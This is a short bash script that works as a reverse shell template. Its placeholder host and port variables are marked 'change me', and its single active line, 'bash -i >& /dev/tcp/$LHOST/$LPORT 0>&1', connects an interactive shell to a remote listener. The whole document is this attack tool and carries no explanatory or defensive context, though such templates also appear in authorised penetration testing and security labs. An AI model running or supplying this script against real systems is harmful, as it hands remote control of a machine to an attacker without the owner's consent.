#!/bin/bash

LHOST=0.0.0.0 #change me
LPORT=4444  # change me
bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1
